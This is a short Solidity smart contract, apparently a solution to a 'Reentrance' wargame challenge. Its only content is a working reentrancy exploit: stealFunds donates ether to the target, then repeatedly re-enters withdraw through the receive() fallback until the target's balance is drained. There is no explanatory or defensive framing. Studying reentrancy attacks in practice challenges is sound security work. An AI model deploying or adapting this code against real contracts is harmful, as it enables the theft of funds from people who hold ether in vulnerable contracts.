// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./IReentrance.sol";

contract ReentrancyAttacker {
    IReentrance immutable i_reentrance;
    uint256 private s_donation;

    constructor(address reentrance) public {
        i_reentrance = IReentrance(payable(reentrance));
    }
    
    function stealFunds() external payable {
        s_donation = msg.value;
        require(s_donation >= 0.01 ether);

        i_reentrance.donate{value: s_donation}(address(this));

        reenter();
    }

    function reenter() internal {
        uint256 reentranceBalance = address(i_reentrance).balance;

        if (reentranceBalance > 0) {
            if (reentranceBalance > s_donation) {
                i_reentrance.withdraw(s_donation);
            } else {
                i_reentrance.withdraw(reentranceBalance);
            }
        }
    }

    receive() external payable {
        reenter();
    }
}